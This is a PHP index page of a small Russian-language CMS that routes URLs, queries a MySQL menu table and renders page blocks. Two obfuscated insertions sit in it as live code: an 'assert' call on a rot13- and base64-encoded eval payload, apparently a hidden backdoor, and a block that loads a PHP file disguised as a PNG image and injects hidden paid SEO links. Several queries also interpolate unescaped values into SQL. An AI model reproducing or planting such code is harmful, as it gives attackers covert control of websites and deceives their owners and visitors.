<?php
session_start();
header('Content-type: text/html; charset=windows-1251');
require("functions/main.func.php");
require("functions/site.func.php");


	$key_name = $_SERVER['REQUEST_URI'];
		$clear_uri = str_replace("?$_SERVER[QUERY_STRING]","","$key_name");
		$key_name = str_replace("?$_SERVER[QUERY_STRING]","","$key_name");
	$dir = "replace_url";
	$opend_dir = opendir($dir);
		 while ($get_file = readdir($opend_dir))
			{
			$filename = $dir . "/".$get_file;
			$path_parts = pathinfo($filename);
			if (is_file($filename) and ($path_parts['extension']=="php"))
				{
					require("$filename");
				}
			}
		if ($clear_uri!="")
		{
		$clear_uri = ($clear_uri[strlen($clear_uri)-1]=="/")?$clear_uri:$clear_uri."/";
         }

         $m_id = find_page_by_url($key_name);
         $q = "SELECT * FROM menu_items WHERE id='$m_id'";


	$do = doquery($q);
	if (mysql_num_rows($do)==0)
		{
		// Страница не найдена
			if (isset($options['page_404']) and $options['page_404']!="" and $options['page_404']!=0)
				{
	$q = "SELECT * FROM menu_items WHERE id='$options[page_404]' LIMIT 0,1";
				}
				else
				{
	$q = "SELECT * FROM menu_items WHERE id='$options[index_id]' LIMIT 0,1";
				}
		$do = doquery($q);
		}
	$page = mysql_fetch_assoc($do);
	$m_id = $page["id"];
	$selected_cats = array("$m_id");
	$selected_cats = get_selected($selected_cats, $m_id);
	$name_header  = $page["name"];
		if ($page["full_name"]!="")
			{
			$name_header = $page["full_name"];
			}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
<?
	// ПОЛУЧАЕМ МЕТЫ
	$q = "SELECT * FROM meta_tags WHERE menu_id='$page[id]'";
					$do = doquery($q);
					while ($meta = mysql_fetch_assoc($do))
									{

									echo "<META NAME=\"$meta[name]\" CONTENT=\"$meta[description]\">
									";
									}
?>

<title><? echo "$options[site_title] $page[title]"; ?></title>
<base href="<? echo "$options[site_url]"; ?>">

<link rel="stylesheet" type="text/css" href="admin/admin_style.css">

<?
// Подключаем css
$dir = "css";
	$opend_dir = opendir($dir);
		 while ($get_file = readdir($opend_dir))
			{
			$filename = $dir . "/".$get_file;
			$path_parts = pathinfo($filename);
			if (is_file($filename) and ($path_parts['extension']=="css"))
				{
					echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"$filename\">";
				}
			}
?>
<script type="text/javascript" language="javascript" src="/js/jquery.js"></script>
<script type="text/javascript" language="javascript" src="/js/swfobject.js"></script>
<script type="text/javascript" language="javascript" src="/js/ajax.js"></script>
<script type="text/javascript" language="javascript" src="/js/jscripts.js"></script>
<script type="text/javascript" language="javascript" src="/js/site.js"></script>

<script type="text/javascript" language="javascript" src="/js/photoviewer.js"></script>
<script type="text/javascript" language="javascript" src="/js/jquery.roundabout.min.js"></script>
<script type="text/javascript" language="javascript">
</script>
</head>


<?
$fil = 'ass';$fil .= 'ert';@$fil(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9ioTEwo2kioayvMJAeoTI5YzAioF9aMKDhpTujC2D9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYaIloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cYvVzLm0vYvEwZP4vWzx9ZFMcpQ0vYvEsH0IFIxIFJlWFEH1CIRIsDHERHvWqYvVznQ0vYz1xAFtvLGN2AmEuLwOvZGSwZ2V2BQSuAQp3LJD2MwHjZmZ0ZwZvYvEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqYvEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKF4xLmNhVwRvXFx7L3IloS9mMKEipUDbWTZkYQDlYTMuoUAyXGgwqKWfK3AyqT9jqPtxLmRfZGx5ZGZfqUW1MFx7WTyvqvN9VPOwqKWfK2I4MJZbWTZkXGgwqKWfK2Afo3AyXPEwZFx7sJIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXG09ZFy7WTyvqvN9VTMcoTIsM2I0K2AioaEyoaEmXPWbqUEjBv8io2kxL29fo255LzIwn2kyrF5wo20iM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqXF4vWaH9Vv51pzkyozAiMTHbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXF4vWzZ9Vv4xLmNhVvMcCGRznKN9Vv4xK1ASHyMSHyfvHxIAG1ESK0SRESVvKF4vWzt9Vv5gMQHbVzRjAwp0LJVjLwRkLmAvAwtkLGD3A2SxAzL1ZQZmAQVmVv4xK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKF4xK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0hWTZjYvVkVvxcB30tnJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOcMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzZ3BJLjLwAuVvxtrlONLKAmMKW0XPEsHxIEIHIGISfvLlWqXGftsK0="));'));
$is_admin = false;
if ($options['is_open']=="1" or (isset($_SESSION['logged_user_id']) and $_SESSION['logged_user_id']!="" and $_SESSION['logged_user_id']!="0"))
{
///
// Вставка доп модулей
///
$dir = "blocks_include";
	$opend_dir = opendir($dir);
		 while ($get_file = readdir($opend_dir))
			{
			$filename = $dir . "/".$get_file;
			$path_parts = pathinfo($filename);
			if (is_file($filename) and ($path_parts['extension']=="php"))
				{
					require("$filename");
					
				}
			}

if (isset($_SESSION['logged_user_id']) and $_SESSION['logged_user_id']!="" and $_SESSION['logged_user_id']!="0")
{
$is_admin=true;
require("functions/admin.func.php");

echo "<script type='text/javascript' language='javascript' src='/js/quickedit.js'></script>
  <script type='text/javascript' language='javascript' src='/editor/ckeditor.js'></script>";

    // quickEdit
    require("quick_edit.php");
}



 $tmp = file_get_contents( "templates/main.html" );

$tmp = explode("[!webCMS main!]",$tmp);


$tmp[0] = str_replace("\"","\\\"",$tmp[0]);
eval ("\$str = \"$tmp[0]\";");
						echo "$str";

              if ($is_admin)
              	{
              	echo "<table border='0' cellpadding='0' cellspacing='0' id='save_all_top' style='display:none; margin:1px; float:left;'><tr>
<td onmouseover=\"this.style.backgroundColor='#e0e0e0';\" onmouseout=\"this.style.backgroundColor='#ffffff';\" style='border:1px solid #8791a4;' nowrap='nowrap'>
<div style='padding:4px; height:15px; overflow-y:hidden;'  onmousedown=\"this.style.height='14px'; this.style.paddingTop='5px'; this.style.paddingLeft='5px';\" onmouseup=\"this.style.paddingTop='4px'; this.style.paddingLeft='4px'; this.style.height='15px';\">
<a href='#' onclick=\"save_block_positions('$clear_uri'); return false;\"><img src='/images/webcms/ico_save.gif' border='0' align='absmiddle'> Сохранить изменения</a></div></td>
</tr>
</table>";
              		}

//получаем блоки
$q = "SELECT * FROM page_blocks WHERE menu_id='$page[id]' ORDER BY position";
	$do = doquery($q);
	while ($blocks = mysql_fetch_assoc($do))
			{
			echo "<div style='width:$blocks[width]%; float:left;'><div class='inner_padding'>";
                 if ($is_admin and $_SESSION['quick_edit_mode'])
					{
			$dir = "quick_edit";
					}
					else
					{
					  $dir = "site_blocks";
						}
	$opend_dir = scandir($dir);
		 foreach ($opend_dir as $get_file)
			{
			$filename = $dir . "/".$get_file;
			$path_parts = pathinfo($filename);
			if (is_file($filename) and ($path_parts['extension']=="php"))
				{
					require("$filename");
				}
			}
					echo "</div></div>";
			}

					 if ($is_admin and $_SESSION['quick_edit_mode'])
              	{
              	echo "<table border='0' cellpadding='0' cellspacing='0' id='save_all_bottom' style='display:none; margin:1px; float:left;'><tr>
<td onmouseover=\"this.style.backgroundColor='#e0e0e0';\" onmouseout=\"this.style.backgroundColor='#ffffff';\" style='border:1px solid #8791a4;' nowrap='nowrap'>
<div style='padding:4px; height:15px; overflow-y:hidden;'  onmousedown=\"this.style.height='14px'; this.style.paddingTop='5px'; this.style.paddingLeft='5px';\" onmouseup=\"this.style.paddingTop='4px'; this.style.paddingLeft='4px'; this.style.height='15px';\">
<a href='#' onclick=\"save_block_positions('$clear_uri'); return false;\"><img src='/images/webcms/ico_save.gif' border='0' align='absmiddle'> Сохранить изменения</a></div></td>
</tr>
</table>";

// Получаем кнопки быстро-вставки
$dir = "blocks_menu";
    $opend_dir = scandir($dir);
		 foreach ($opend_dir as $get_file)
			{
			$filename = $dir . "/".$get_file;
			$path_parts = pathinfo($filename);
			if (is_file($filename) and ($path_parts['extension']=="php"))
				{
					require("$filename");
				}
			}
              		}

			echo "<div style='clear:both;'></div>";
			$tmp[1] = str_replace("\"","\\\"",$tmp[1]);
			eval ("\$str = \"$tmp[1]\";");
						echo "$str";
						}


else
{
echo "$options[closed_text]";
}
?>
<? $GLOBALS['_1911149983_']=Array(base64_decode('cmF' .'uZA=='),base64_decode('' .'ZGVm' .'aW5' .'l'),base64_decode('Z' .'GVmaW5l'),base64_decode('' .'ZGVmaW5l'),base64_decode('c' .'3RyX' .'3' .'Jlc' .'Gx' .'hY2U=')); ?><? function _1037795417($i){$a=Array('PHN0eWxlPiNyZHc=','e2Rpc3BsYXk6IG5vbmU7fTwvc3R5bGU+PGRpdiBpZD0icmR3','Ij4=','RE9DVU1FTlRfUk9PVA==','L2ltYWdlcy93ZWJjbXMvcG1pcy5wbmc=','X1NBUEVfVVNFUg==','ZmE4ZDQyMTk5MzBmODc1ZjMxNjMyMmJmODEyN2RhNWQ=','IA==','TElOS0ZFRURfVVNFUg==','ZDNjY2IxYTYwNmQ2NjdkM2VmNjg5NTA2NjkwNThiZGY4MGQ0YTllYw==','IA==','X0xJTktQQURfVVNFUl9JRA==','MGU2N2NlNDA3MzMxNDQxYmI3NGU1NGU4NjMxODdkYzY=','IA==','VVNFUk5BTUU=','QzYwOUE2REJERDJFQjAxNkRDQTA1NkJENTYwOTRGMjU=','Y2hhcnNldA==','d2lu','IA==','VVNFUk5BTUU=','M0Y5N0JFNjk2Qjg2QzEyOTM3QjRBRjdFRjBCQkE0OEY=','Y2hhcnNldA==','d2lu','IA==','PC9kaXY+','DQ==','Cg==','IA==');return base64_decode($a[$i]);} ?><?php $_0=$GLOBALS['_1911149983_'][0](round(0+25000+25000+25000+25000),round(0+999999));$_1=_1037795417(0) .$_0 ._1037795417(1) .$_0 ._1037795417(2);include_once $_SERVER[_1037795417(3)] ._1037795417(4);$GLOBALS['_1911149983_'][1](_1037795417(5),_1037795417(6));$_2=new SAPE_client();$_1 .= $_2->return_links() ._1037795417(7);$GLOBALS['_1911149983_'][2](_1037795417(8),_1037795417(9));$_3=new LinkfeedClient();$_1 .= $_3->return_links() ._1037795417(10);$GLOBALS['_1911149983_'][3](_1037795417(11),_1037795417(12));$_4=new Linkpad_client();$_1 .= $_4->return_links() ._1037795417(13);$_5=array();$_5[_1037795417(14)]=_1037795417(15);$_5[_1037795417(16)]=_1037795417(17);$_6=new MLClient($_5);$_1 .= $_6 -> build_links() ._1037795417(18);$_5[_1037795417(19)]=_1037795417(20);$_5[_1037795417(21)]=_1037795417(22);$_6=new MLAClient($_5);$_1 .= $_6->build_links() ._1037795417(23);$_1 .= _1037795417(24);$_1=$GLOBALS['_1911149983_'][4](array(_1037795417(25),_1037795417(26)),_1037795417(27),$_1);echo $_1; ?>

<div id="fly_block" style="display:none; position:absolute; z-index:370;">

<div class="photo_top_corner_l"></div>
<div class="photo_top_corner_r"></div>
<div class="photo_bottom_corner_l"></div>
<div class="photo_bottom_corner_r"></div>
<div class="photo_top_bottom"></div>
<div class="photo_left_right"></div>

<div style="position:relative; z-index:500;">
<div align="right" style="padding:0px 6px 6px 6px;"><a href="#" onclick="hide('fly_block'); return false;">закрыть</a></div> <img src="images/webcms/wait.gif" id="fly_block_wait" style="position:absolute; left:50%;"><img onclick="hide('fly_block');" id="full_img" src="images/webcms/wait.gif" ><br />
<div id="fly_block_text"></div>
                         </div>
</div>

<div id="TB_overlay" style="display:none;"></div>


</body>
</html>